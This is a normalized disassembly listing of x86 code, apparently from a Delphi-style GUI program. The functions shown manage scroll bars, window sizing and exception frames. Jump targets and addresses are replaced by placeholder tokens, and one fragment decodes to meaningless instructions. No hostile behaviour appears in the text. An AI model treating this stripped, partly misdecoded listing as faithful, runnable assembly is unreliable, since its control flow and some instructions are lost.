lea eax [ eax + eax * 4 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ esi ]
mov eax [ eax + 0x4 ]
call sub_43df6c
push eax
call sub_425c3c
mov eax [ esi ]
cmp [ eax + 0x24 ] 0x0
jle r-xdata
mov eax [ esi ]
cmp [ eax + 0x38 ] 0x0
jle r-xdata
push 0x0
mov eax [ esi ]
mov eax [ eax + 0x24 ]
push eax
mov eax [ esi ]
movzx eax [ eax + 0x18 ]
lea eax [ eax + eax * 4 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ esi ]
mov eax [ eax + 0x4 ]
call sub_43df6c
push eax
call sub_425c3c
mov eax [ esi ]
cmp [ eax + 0x30 ] 0x0
jle r-xdata
push 0x0
mov eax [ esi ]
mov eax [ eax + 0x38 ]
push eax
mov eax [ esi ]
movzx eax [ eax + 0x18 ]
lea eax [ eax + eax * 4 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ esi ]
mov eax [ eax + 0x4 ]
call sub_43df6c
push eax
call sub_425c3c
push 0x0
mov eax [ esi ]
mov eax [ eax + 0x28 ]
call sub_41d4f8
push eax
mov eax [ esi ]
movzx eax [ eax + 0x18 ]
lea eax [ eax + eax * 4 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ esi ]
mov eax [ eax + 0x4 ]
call sub_43df6c
push eax
call sub_425c3c
pop esi
pop ebx
pop ebp
retn
push 0x0
mov eax [ esi ]
mov eax [ eax + 0x30 ]
push eax
mov eax [ esi ]
movzx eax [ eax + 0x18 ]
lea eax [ eax + eax * 4 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ esi ]
mov eax [ eax + 0x4 ]
call sub_43df6c
push eax
call sub_425c3c
sub_44ebbc
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
push edi
mov [ ebp - 0x6 ] cl
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
lea esi [ ebp - 0x4 ]
mov eax [ esi ]
xor edx edx
mov [ eax + 0x14 ] edx
xor ebx ebx
mov eax [ esi ]
cmp [ eax + 0x18 ] 0x1
jne r-xdata
mov eax [ esi ]
cmp [ eax + 0x1c ] 0x0
je r-xdata
mov bx 0x1
mov [ ebp - 0x22 ] 0x1c
mov [ ebp - 0x1e ] 0x17
xor eax eax
mov [ ebp - 0x1a ] eax
mov eax [ esi ]
cmp [ eax + 0x14 ] 0x0
jle r-xdata
mov cl [ ebp - 0x6 ]
mov dl [ ebp - 0x5 ]
mov eax [ esi ]
call sub_44e4d0
mov edx [ esi ]
mov edi [ edx + 0x10 ]
sub edi eax
mov eax [ esi ]
mov [ eax + 0x14 ] edi
test edi edi
jge r-xdata
xor eax eax
mov [ ebp - 0x16 ] eax
mov eax [ esi ]
mov eax [ eax + 0x10 ]
mov [ ebp - 0x16 ] eax
jmp r-xdata
mov eax [ esi ]
xor edx edx
mov [ eax + 0x14 ] edx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
movzx eax bx
mov ecx 0xa
xor edx edx
div ecx
mov edx [ esi ]
mov [ edx + 0x8 ] ax
mov cl [ ebp - 0x6 ]
mov dl [ ebp - 0x5 ]
mov eax [ esi ]
call sub_44e4d0
inc eax
mov [ ebp - 0x12 ] eax
mov eax [ esi ]
mov eax [ eax + 0xc ]
mov [ ebp - 0xe ] eax
mov [ ebp - 0xa ] eax
push ebp
mov eax [ esi ]
mov al [ eax + 0x44 ]
call sub_44eab4
pop ecx
mov eax [ esi ]
mov [ eax + 0x44 ] 0x0
push 0xffffffff
lea eax [ ebp - 0x22 ]
push eax
movzx eax bx
push eax
mov eax [ esi ]
mov eax [ eax + 0x4 ]
call sub_43df6c
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov eax [ esi ]
mov edx [ eax + 0xc ]
mov eax [ esi ]
call sub_44e938
xor ecx ecx
mov dl 0x1
mov eax [ esi ]
call sub_44e4d0
lea eax [ eax + eax * 8 ]
mov ecx 0xa
cdq
idiv ecx
mov ebx eax
mov eax [ esi ]
mov [ eax + 0xa ] bx
mov eax [ esi ]
cmp [ eax + 0x1f ] 0x0
je r-xdata
sub_44ecd4
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_439c98
mov eax [ esi + 0x50 ]
or eax [ r-xdata ]
mov [ esi + 0x50 ] eax
push 0x0
mov ecx esi
mov dl 0x1
mov eax [ r-xdata ]
call sub_44e150
mov [ esi + 0x208 ] eax
push 0x1
mov ecx esi
mov dl 0x1
mov eax [ r-xdata ]
call sub_44e150
mov [ esi + 0x20c ] eax
mov [ esi + 0x210 ] 0x1
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035a0
mov eax esi
pop esi
pop ebx
retn
call sub_4035f8
pop [ fs : 0x0 ]
add esp 0xc
sub_44ed4c
push ebx
push esi
call sub_403608
mov ebx edx
mov esi eax
mov eax [ esi + 0x208 ]
call sub_403294
mov eax [ esi + 0x20c ]
call sub_403294
mov edx ebx
and dl 0xfc
mov eax esi
call sub_439dbc
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035f0
sub_44ed98
push ebx
mov ebx eax
mov eax ebx
call sub_43af24
mov eax [ rw-data ]
cmp [ eax + 0xd ] 0x0
jne r-xdata
mov eax ebx
call sub_44efb0
pop ebx
retn
mov edx 0x1
mov eax 0x5
call sub_40bdc0
test al al
jne r-xdata
mov eax ebx
call sub_43df6c
push eax
call sub_425c70
sub_44edd8
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
call sub_44ef30
mov ecx edi
mov edx esi
mov eax ebx
call sub_43a66c
pop edi
pop esi
pop ebx
retn
sub_44ee18
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403264
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_44ef20
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_4371b0
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x208 ]
mov eax ebx
call sub_44e3e8
test al al
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebx + 0x10 ]
cmp eax [ ebp - 0x8 ]
jg r-xdata
mov [ ebp - 0x9 ] al
cmp [ ebp - 0x9 ] 0x0
je r-xdata
mov al 0x1
mov eax [ ebp - 0x4 ]
call sub_43ac9c
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ ebx + 0x10 ]
mov [ ebp - 0x8 ] eax
xor edx edx
mov eax ebx
call sub_44e938
mov eax [ ebp - 0x10 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
inc esi
xor ebx ebx
cmp [ ebp - 0x9 ] 0x0
je r-xdata
inc esi
xor ebx ebx
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_43ac60
mov edi eax
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_43ac60
mov edx eax
mov eax [ ebp - 0x10 ]
call sub_414014
mov edx [ ebp - 0x8 ]
sub edx [ edi + 0x48 ]
sub edx [ edi + 0x40 ]
mov eax edi
call sub_436f1c
inc ebx
dec esi
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44ef27
mov eax [ ebp - 0x10 ]
call sub_403294
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_44e230
push 0x0
mov edx ebx
mov eax [ ebp - 0x10 ]
call sub_414170
xor ecx ecx
mov edx 0xb03e
call sub_438978
inc ebx
dec esi
jne r-xdata
sub_44ef54
push ebx
mov ebx eax
cmp dl [ ebx + 0x210 ]
je r-xdata
pop ebx
retn
mov [ ebx + 0x210 ] dl
test dl dl
je r-xdata
xor edx edx
mov eax [ ebx + 0x208 ]
call sub_44ea88
xor edx edx
mov eax [ ebx + 0x20c ]
call sub_44ea88
mov eax ebx
call sub_44ef30
jmp r-xdata
sub_44efb0
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x218 ] 0x0
jne r-xdata
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_43e270
test al al
je r-xdata
xor eax eax
push ebp
push sub_44f09b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov [ eax + 0x218 ] 0x1
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20c ]
call sub_44e550
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_44e550
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
mov cl 0x1
xor edx edx
call sub_44ebbc
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20c ]
xor ecx ecx
mov dl 0x1
call sub_44ebbc
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20c ]
xor ecx ecx
xor edx edx
call sub_44ebbc
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
xor ecx ecx
mov dl 0x1
call sub_44ebbc
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20c ]
mov cl 0x1
xor edx edx
call sub_44ebbc
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
xor ecx ecx
mov dl 0x1
call sub_44ebbc
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x218 ] 0x0
retn
sub_44f0c0
push ebx
push esi
push edi
push ebp
add esp 0xffffffe0
mov esi edx
mov ebx eax
mov edi esp
test esi esi
je r-xdata
add esp 0x20
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx edi
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebx + 0x208 ]
movzx eax [ eax + 0x1a ]
sub [ edi ] eax
add [ edi + 0x8 ] eax
mov eax [ ebx + 0x20c ]
movzx eax [ eax + 0x1a ]
sub [ edi + 0x4 ] eax
add [ edi + 0xc ] eax
lea ecx [ esp + 0x18 ]
mov edx edi
mov eax esi
call sub_4372c4
lea edx [ esp + 0x18 ]
lea ecx [ esp + 0x10 ]
mov eax ebx
call sub_4372f0
mov eax [ esp + 0x10 ]
mov [ edi ] eax
mov eax [ esp + 0x14 ]
mov [ edi + 0x4 ] eax
lea ecx [ esp + 0x18 ]
lea edx [ edi + 0x8 ]
mov eax esi
call sub_4372c4
lea edx [ esp + 0x18 ]
lea ecx [ esp + 0x10 ]
mov eax ebx
call sub_4372f0
mov eax [ esp + 0x10 ]
mov [ edi + 0x8 ] eax
mov eax [ esp + 0x14 ]
mov [ edi + 0xc ] eax
mov esi [ edi ]
test esi esi
jge r-xdata
mov eax ebx
call sub_4371b0
mov ebp [ edi + 0x8 ]
cmp eax ebp
jge r-xdata
mov eax [ ebx + 0x208 ]
mov edx [ eax + 0xc ]
add edx esi
call sub_44e938
jmp r-xdata
mov esi [ edi + 0x4 ]
test esi esi
jge r-xdata
mov eax ebx
call sub_4371b0
sub ebp esi
cmp eax ebp
jge r-xdata
mov eax ebx
call sub_4371f4
mov ebp [ edi + 0xc ]
cmp eax ebp
jge r-xdata
mov eax [ ebx + 0x20c ]
mov edx [ eax + 0xc ]
add edx esi
call sub_44e938
jmp r-xdata
mov esi [ ebx + 0x208 ]
mov eax ebx
call sub_4371b0
mov edx [ esi + 0xc ]
add edx [ edi + 0x8 ]
sub edx eax
mov eax esi
call sub_44e938
mov eax ebx
call sub_4371b0
add eax [ edi ]
mov [ edi + 0x8 ] eax
mov eax ebx
call sub_4371f4
sub ebp esi
cmp eax ebp
jge r-xdata
mov esi [ ebx + 0x20c ]
mov eax ebx
call sub_4371f4
mov edx [ esi + 0xc ]
add edx [ edi + 0xc ]
sub edx eax
mov eax esi
call sub_44e938
mov eax ebx
call sub_4371f4
add eax [ edi + 0x4 ]
mov [ edi + 0xc ] eax
sub_44f214
push ebx
push esi
push edi
push ebp
mov edi ecx
mov esi edx
mov ebx eax
cmp edi esi
je r-xdata
mov eax [ ebx + 0x208 ]
mov [ eax + 0x1e ] 0x0
mov eax [ ebx + 0x20c ]
mov [ eax + 0x1e ] 0x0
pop ebp
pop edi
pop esi
pop ebx
retn
test [ ebx + 0x1c ] 0x1
jne r-xdata
xor edx edx
mov eax [ ebx + 0x208 ]
call sub_44e938
xor edx edx
mov eax [ ebx + 0x20c ]
call sub_44e938
cmp [ ebx + 0x210 ] 0x0
jne r-xdata
mov eax [ ebx + 0x208 ]
mov [ eax + 0x1e ] 0x1
mov eax [ ebx + 0x20c ]
mov [ eax + 0x1e ] 0x1
mov ebp [ ebx + 0x208 ]
cmp [ ebp + 0x1e ] 0x0
je r-xdata
mov ebp [ ebx + 0x20c ]
cmp [ ebp + 0x1e ] 0x0
je r-xdata
push edi
push esi
mov eax [ ebp + 0x10 ]
push eax
call MulDiv
mov edx eax
mov eax ebp
call sub_44ea88
push edi
push esi
mov eax [ ebp + 0x10 ]
push eax
call MulDiv
mov edx eax
mov eax ebp
call sub_44ea88
sub_44f2b8
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_44f214
mov ecx edi
mov edx esi
mov eax ebx
call sub_43da78
pop edi
pop esi
pop ebx
retn
sub_44f2e0
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
inc [ eax + 0x214 ]
xor edx edx
push ebp
push sub_44f34a
push [ fs : edx ]
mov [ fs : edx ] esp
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_43c558
xor eax eax
mov edx [ ebx + 0x4 ]
sub edx 0x1
jb r-xdata
xor eax eax
jmp r-xdata
je r-xdata
mov edx eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xd0 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44f351
mov eax [ ebp - 0x4 ]
dec [ eax + 0x214 ]
retn
mov al 0x1
jmp r-xdata
dec edx
je r-xdata
mov al 0x2
jmp r-xdata
sub_44f351
mov eax [ ebp - 0x4 ]
mov [ eax + 0x218 ] 0x1
xor eax eax
push ebp
push sub_44f389
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_44ef30
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44f390
mov eax [ ebp - 0x4 ]
mov [ eax + 0x218 ] 0x0
retn
sub_44f390
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
cmp [ eax + 0x1c ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_44efb0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20c ]
cmp [ eax + 0x1c ] 0x0
je r-xdata
pop ebx
pop ecx
pop ebp
retn
sub_44f404
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
mov ebx eax
mov eax ebx
call sub_4371f4
mov edx [ ebx + 0x20c ]
mov edx [ edx + 0x10 ]
call sub_4232f8
push eax
lea eax [ esp + 0x4 ]
push eax
mov eax ebx
call sub_4371b0
mov edx eax
mov edi [ ebx + 0x208 ]
mov eax [ edi + 0x10 ]
call sub_4232f8
mov ecx eax
mov eax [ ebx + 0x20c ]
mov edx [ eax + 0xc ]
neg edx
mov eax [ edi + 0xc ]
neg eax
call sub_412d30
push esi
mov edi esi
lea esi [ esp + 0x4 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
mov edx esi
mov eax ebx
call sub_439fd8
add esp 0x10
pop edi
pop esi
pop ebx
retn
sub_44f474
push ebp
mov ebp esp
add esp 0xfffffff4
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_44f4d5
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ rw-data ]
call sub_403420
test al al
jne r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_43d2e8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44f4dc
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0xc ]
mov [ eax + 0x4 ] edx
retn
mov eax [ ebp - 0x8 ]
mov [ eax + 0x4 ] 0x1
sub_44f504
push ebp
mov ebp esp
add esp 0xfffffeec
push ebx
xor ebx ebx
mov [ ebp - 0x114 ] ebx
test dl dl
je r-xdata
mov ebx ecx
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_44f668
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax ]
call [ edx + 0x14 ]
xor eax eax
push ebp
push sub_44f648
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
mov ecx ebx
xor edx edx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xe0 ]
mov eax [ ebp - 0x4 ]
call sub_4031dc
cmp eax [ r-xdata ]
je r-xdata
add esp 0xfffffff0
call sub_4035a0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44f64f
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax ]
call [ edx + 0x18 ]
retn
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov eax [ ebp - 0x4 ]
or [ eax + 0x2f4 ] 0x1
xor eax eax
push ebp
push sub_44f610
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ r-xdata ]
mov eax [ ebp - 0x4 ]
call sub_413f30
test al al
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
and [ eax + 0x2f4 ] 0xfe
retn
lea edx [ ebp - 0x110 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
call sub_4031e4
lea eax [ ebp - 0x110 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0x4
lea eax [ ebp - 0x10 ]
push eax
push 0x0
lea edx [ ebp - 0x114 ]
mov eax [ rw-data ]
call sub_405b50
mov ecx [ ebp - 0x114 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b5cc
call sub_403a08
sub_44f690
push ebx
push esi
mov ebx eax
cmp [ ebx + 0x234 ] 0x0
jne r-xdata
test [ ebx + 0x2f4 ] 0x20
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xd4 ]
pop esi
pop ebx
retn
mov eax ebx
mov si 0xffb3
call sub_403490
and [ ebx + 0x2f4 ] 0xdf
sub_44f6c8
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_44ecd4
mov eax [ r-xdata ]
mov [ ebx + 0x50 ] eax
xor edx edx
mov eax ebx
call sub_436f1c
xor edx edx
mov eax ebx
call sub_436f40
mov edx 0x140
mov eax ebx
call sub_436f68
mov edx 0xf0
mov eax ebx
call sub_436f8c
mov dl 0x1
mov eax [ r-xdata ]
call sub_42288c
mov esi eax
mov [ ebx + 0x240 ] esi
push 0x31
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edx eax
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x40 ]
push 0x32
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edx eax
mov eax [ ebx + 0x240 ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov eax [ ebx + 0x240 ]
mov [ eax + 0x14 ] ebx
mov [ eax + 0x10 ] sub_44ffe4
mov dl 0x1
mov eax [ r-xdata ]
call sub_41e2d4
mov esi eax
mov [ ebx + 0x238 ] esi
mov eax esi
mov edx ebx
call sub_436388
mov al [ r-xdata ]
mov [ ebx + 0x228 ] al
mov [ ebx + 0x229 ] 0x2
mov [ ebx + 0x22b ] 0x0
mov [ ebx + 0x231 ] 0x3
mov [ ebx + 0x244 ] 0x0
mov eax [ rw-data ]
mov eax [ eax + 0x40 ]
mov [ ebx + 0x25c ] eax
mov [ ebx + 0x235 ] 0x1
mov eax ebx
call sub_4031dc
mov [ ebx + 0xb8 ] eax
mov [ ebx + 0x2e1 ] 0xff
xor eax eax
mov [ ebx + 0x2ec ] eax
xor edx edx
mov eax ebx
call sub_450348
xor edx edx
mov eax ebx
call sub_437970
xor edx edx
mov eax ebx
call sub_4378d8
mov dl 0x1
mov eax ebx
call sub_43e0ac
mov edx ebx
mov eax [ rw-data ]
call sub_4549ac
mov [ ebx + 0x2e4 ] 0xa
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_4035a0
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
call sub_4035f8
pop [ fs : 0x0 ]
add esp 0xc
sub_44f841
add [ eax ] al
add [ ebx - 0x75 ] dl
fsub [ ecx + rw-data ]
mov eax [ eax ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov eax ebx
call sub_41abe4
mov eax [ rw-data ]
mov eax [ eax + 0x7c ]
mov edx ebx
call sub_41430c
xor edx edx
mov eax ebx
call sub_4175b0
cmp [ ebx + 0x264 ] 0x0
je r-xdata
cmp [ ebx + 0x22f ] 0x1
je r-xdata
mov eax [ ebx + 0x264 ]
mov edx [ eax ]
call [ edx + 0xc ]
cmp [ ebx + 0x234 ] 0x0
jne r-xdata
mov eax ebx
call sub_453854
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0xd8 ]
sub_44f8ac
push ebp
mov ebp esp
add esp 0xfffffff8
call sub_403608
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x8
jne r-xdata
xor eax eax
push ebp
push sub_44f976
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x234 ] 0x0
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax ]
call [ edx + 0x14 ]
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_4521d0
mov eax [ ebp - 0x4 ]
call sub_43e270
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xd8 ]
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_4549e4
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x238 ]
call sub_403294
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x240 ]
call sub_403294
mov eax [ ebp - 0x4 ]
add eax 0x2f0
call sub_40d19c
mov dl [ ebp - 0x5 ]
and dl 0xfc
mov eax [ ebp - 0x4 ]
call sub_44ed4c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44f97d
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax ]
call [ edx + 0x18 ]
retn
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xac ]
sub_44f990
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x2d2 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x2f4 ] 0x2
je r-xdata
xor eax eax
push ebp
push sub_44f9d1
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x2d4 ]
call [ ebx + 0x2d0 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov dl 0x1
mov eax [ ebp - 0x4 ]
call sub_450348
sub_44f9d6
mov eax [ ebp - 0x4 ]
mov si 0xffad
call sub_403490
test al al
jne r-xdata
call sub_403a84
mov eax [ ebp - 0x4 ]
test [ eax + 0x2f4 ] 0x2
je r-xdata
call sub_403a30
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov dl 0x1
mov eax [ ebp - 0x4 ]
call sub_450348
sub_44fa0c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x2da ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
xor eax eax
push ebp
push sub_44fa4d
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x2dc ]
call [ ebx + 0x2d8 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
sub_44fa6c
push ebx
push esi
push edi
mov ebx eax
mov eax ebx
call sub_439880
mov eax [ ebx + 0x220 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edi eax
xor eax eax
mov [ ebx + 0x220 ] eax
mov eax edi
mov si 0xffb8
call sub_403490
test al al
je r-xdata
mov edx edi
mov eax ebx
call sub_451d14
sub_44faa8
push ebx
push esi
push edi
push ebp
mov ebx ecx
mov esi edx
mov edi eax
mov ecx ebx
mov edx esi
mov eax edi
call sub_436c7c
mov eax ebx
sub al 0x1
jb r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_403420
test al al
je r-xdata
je r-xdata
test [ edi + 0x1c ] 0x1
jne r-xdata
cmp [ edi + 0x2f0 ] 0x0
jne r-xdata
mov ebp [ edi + 0x2f0 ]
test ebp ebp
je r-xdata
jmp r-xdata
cmp [ edi + 0x250 ] 0x0
je r-xdata
cmp [ edi + 0x248 ] 0x0
jne r-xdata
mov edx esi
mov eax [ edi + 0x2f0 ]
call sub_414014
jmp r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_403264
mov [ edi + 0x2f0 ] eax
cmp esi [ edi + 0x248 ]
jne r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_403420
test al al
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov ecx ebx
mov edx esi
mov eax [ edi + 0x250 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
cmp edi [ esi + 0x4 ]
jne r-xdata
cmp esi [ edi + 0x258 ]
jne r-xdata
xor edx edx
mov eax edi
call sub_45110c
mov edx esi
mov eax ebp
call sub_41430c
jmp r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_403420
test al al
je r-xdata
cmp esi [ edi + 0x260 ]
jne r-xdata
xor edx edx
mov eax edi
call sub_4510e4
mov edx esi
mov eax edi
call sub_45110c
jmp r-xdata
xor edx edx
mov eax edi
call sub_4510c0
sub_44fbb4
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_43a804
xor edx edx
push ebp
push sub_44fe0a
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x268 ] edx
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x26c ] edx
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x270 ] edx
xor ebx ebx
mov al [ rw-data ]
xor al 0x1
mov edx [ ebp - 0x4 ]
mov [ edx + 0x234 ] al
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_439f60
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x25c ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x268 ]
test eax eax
jle r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x270 ] 0x0
jle r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x26c ]
test eax eax
jle r-xdata
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_4371c8
mov eax [ ebp - 0x4 ]
test [ eax + 0x98 ] 0x10
je r-xdata
mov eax [ ebp - 0x4 ]
mov dl [ r-xdata ]
mov [ eax + 0x98 ] dl
test bl bl
jne r-xdata
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_43720c
mov eax [ rw-data ]
mov eax [ eax + 0x40 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x25c ] eax
mov eax [ ebp - 0x4 ]
call sub_44ff3c
mov esi eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x270 ]
cmp esi eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x25c ]
mov edx [ rw-data ]
cmp eax [ edx + 0x40 ]
je r-xdata
push 0x0
xor ecx ecx
mov edx 0xb03d
mov eax [ ebp - 0x4 ]
call sub_438978
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44fe11
mov eax [ ebp - 0x4 ]
call sub_43a80c
retn
mov ecx 0x1
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_44f214
mov ecx 0x1
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_43da30
mov bl 0x1
mov ecx eax
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_44f214
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x270 ]
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_43da30
mov eax [ ebp - 0x4 ]
test [ eax + 0x98 ] 0x4
